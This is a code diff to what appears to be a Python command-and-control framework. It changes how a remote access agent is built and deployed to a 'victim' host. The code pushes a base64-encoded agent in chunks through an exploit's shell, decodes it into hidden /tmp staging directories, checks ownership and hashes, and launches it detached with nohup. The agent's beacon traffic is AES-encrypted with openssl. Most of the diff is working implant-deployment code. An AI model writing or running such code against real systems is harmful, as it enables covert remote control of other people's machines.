@@ -22,14 +22,19 @@ Security invariants:
        explicit start()/deploy() calls with timeouts.
     3. All C2 API calls use operator basic-auth; the agent channel
        itself is AES-encrypted like every other beacon.
+    4. Remote staging uses a fresh mktemp -d private directory and the
+       decoded agent is hash-verified before launch; fixed names in
+       shared /tmp are never used for privileged execution.
 """
 
 from __future__ import annotations
 
+import hashlib
 import json
 import logging
 import os
 import re
+import secrets
 import subprocess
 import sys
 import time
@@ -46,7 +51,8 @@ _C2_LOG = _SESSIONS_DIR / "c2_server.log"
 _ID_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9_-]{0,63}$")
 ROOT_PRIVILEGE = "root"
 LOW_PRIVILEGE = "lowpriv"
-_ROOT_STAGED_MARKER = "sysagent-r"
+_STAGE_DIR_TEMPLATE = "/tmp/.lzdep.XXXXXXXXXX"
+_STAGE_DIR_PREFIX = "/tmp/.lzdep."
 _CREDENTIALS_FILE = _BASE_DIR / ".c2_credentials.txt"
 
 
@@ -138,7 +144,8 @@ KEY = "{KEY}"
 RATKEY = "{RATKEY}"
 SLEEP = {SLEEP}
 TIMEOUT = 25
-LOG = "/tmp/.agent.log"
+FILEUNIQ = "{FILEUNIQ}"
+LOG = "/tmp/.agent-" + FILEUNIQ + ".log"
 
 # python2.5 has no per-call timeout kwarg: set a global default instead.
 try:
@@ -176,11 +183,12 @@ def _aes_decrypt_b64(blob):
         return None
     if len(raw) < 16:
         return ""
-    open("/tmp/.bct", "wb").write(raw[16:])
+    ct_path = "/tmp/.bct-" + FILEUNIQ
+    open(ct_path, "wb").write(raw[16:])
     iv = raw[:16].encode("hex")
-    out = _sh("openssl enc -d -aes-256-cfb -K " + KEY + " -iv " + iv + " -in /tmp/.bct 2>/dev/null")
+    out = _sh("openssl enc -d -aes-256-cfb -K " + KEY + " -iv " + iv + " -in " + ct_path + " 2>/dev/null")
     try:
-        os.unlink("/tmp/.bct")
+        os.unlink(ct_path)
     except Exception:
         pass
     return out
@@ -188,12 +196,14 @@ def _aes_decrypt_b64(blob):
 
 def _aes_encrypt_b64(plain):
     iv = os.urandom(16)
-    open("/tmp/.bpt", "wb").write(plain)
-    _sh("openssl enc -e -aes-256-cfb -K " + KEY + " -iv " + iv.encode("hex") + " -in /tmp/.bpt -out /tmp/.bct 2>/dev/null")
+    pt_path = "/tmp/.bpt-" + FILEUNIQ
+    ct_path = "/tmp/.bct-" + FILEUNIQ
+    open(pt_path, "wb").write(plain)
+    _sh("openssl enc -e -aes-256-cfb -K " + KEY + " -iv " + iv.encode("hex") + " -in " + pt_path + " -out " + ct_path + " 2>/dev/null")
     try:
-        ct = open("/tmp/.bct", "rb").read()
-        os.unlink("/tmp/.bpt")
-        os.unlink("/tmp/.bct")
+        ct = open(ct_path, "rb").read()
+        os.unlink(pt_path)
+        os.unlink(ct_path)
     except Exception:
         return ""
     return base64.b64encode(iv + ct)
@@ -445,6 +455,7 @@ def build_agent(
     text = text.replace("{KEY}", key)
     text = text.replace("{RATKEY}", rat)
     text = text.replace("{SLEEP}", str(max(2, min(int(sleep), 300))))
+    text = text.replace("{FILEUNIQ}", secrets.token_hex(8))
     return text
 
 
@@ -532,8 +543,11 @@ def deploy(
     Uses the highest-ranked exec-capable exploit to drop the rendered
     agent, chmod +x, and launch it detached. Returns the client id and
     a callback-wait summary. ``privilege="root"`` restricts the shell
-    primitive to root-capable exploits and stages the binary under a
-    different name so a low-priv agent on the same box keeps running.
+    primitive to root-capable exploits. Staging happens inside a fresh
+    ``mktemp -d`` private directory (mode 0700, random name, never a
+    predictable shared /tmp path); for root deployments the staging
+    owner is verified and the decoded agent is hash-checked before
+    launch, so a low-priv agent on the same box keeps running.
 
     Args:
         target: Victim address.
@@ -573,7 +587,6 @@ def deploy(
         sleep=sleep,
         privilege=wanted,
     )
-    recently = "sysagent-r" if is_root else "sysagent"
     staged = _SESSIONS_DIR / "temp_uploads" / f"agent_{client_id}.py"
     staged.parent.mkdir(parents=True, exist_ok=True)
     staged.write_text(agent, encoding="utf-8")
@@ -599,25 +612,50 @@ def deploy(
     chunk = 4000
     parts = [blob[i : i + chunk] for i in range(0, len(blob), chunk)]
     try:
-        remote_exec(spec, target, f"printf '%s' '{parts[0]}' > /tmp/.{recently}.b64", lhost=lhost)
+        stage_out = remote_exec(spec, target, f"mktemp -d {_STAGE_DIR_TEMPLATE}", lhost=lhost)
+        stage_dir = (stage_out or "").strip().splitlines()[-1].strip() if (stage_out or "").strip() else ""
+        suffix = stage_dir[len(_STAGE_DIR_PREFIX):] if stage_dir.startswith(_STAGE_DIR_PREFIX) else ""
+        if not suffix.isalnum():
+            return {
+                "deployed": False,
+                "reason": "private staging dir unavailable",
+                "client_id": client_id,
+            }
+        b64_path = f"{stage_dir}/payload.b64"
+        agent_path = f"{stage_dir}/agent.py"
+        remote_exec(spec, target, f"printf '%s' '{parts[0]}' > {b64_path}", lhost=lhost)
         for part in parts[1:]:
-            remote_exec(spec, target, f"printf '%s' '{part}' >> /tmp/.{recently}.b64", lhost=lhost)
+            remote_exec(spec, target, f"printf '%s' '{part}' >> {b64_path}", lhost=lhost)
         verify = remote_exec(
             spec,
             target,
-            f"base64 -d /tmp/.{recently}.b64 > /tmp/.{recently} && rm -f /tmp/.{recently}.b64"
-            f" && wc -c < /tmp/.{recently} && head -1 /tmp/.{recently}",
+            f"base64 -d {b64_path} > {agent_path} && rm -f {b64_path}"
+            f" && wc -c < {agent_path} && head -1 {agent_path}",
             lhost=lhost,
         )
         size_ok = str(len(agent.encode())) in (verify or "")
-        grep_pattern = f"'[{recently[0]}]{recently[1:]}'"
+        if is_root:
+            owner_out = remote_exec(spec, target, f"stat -c '%u' {agent_path}", lhost=lhost)
+            owner = (owner_out or "").strip().split()[-1] if (owner_out or "").strip() else ""
+            if owner != "0":
+                remote_exec(spec, target, f"rm -rf {stage_dir}", lhost=lhost)
+                return {
+                    "deployed": False,
+                    "reason": f"staging not root-owned (uid {owner or 'unknown'})",
+                    "client_id": client_id,
+                }
+        agent_hash = hashlib.sha256(agent.encode()).hexdigest()
+        tag_pattern = f"'[{suffix[0]}]{suffix[1:]}'"
         launched = remote_exec(
             spec,
             target,
-            f"chmod +x /tmp/.{recently} && (nohup python /tmp/.{recently} </dev/null >/dev/null 2>&1 &) && sleep 2 && ps aux | grep -c {grep_pattern}",
+            f"echo '{agent_hash}  {agent_path}' | sha256sum --check --status && chmod 700 {agent_path}"
+            f" && (nohup python {agent_path} </dev/null >/dev/null 2>&1 &) && sleep 2"
+            f" && ps aux | grep -c {tag_pattern}",
             lhost=lhost,
         )
         running = (launched or "").strip().split()[-1] if (launched or "").strip() else "0"
+        remote_exec(spec, target, f"rm -rf {stage_dir}", lhost=lhost)
     finally:
         _close_shells(target)
     return {
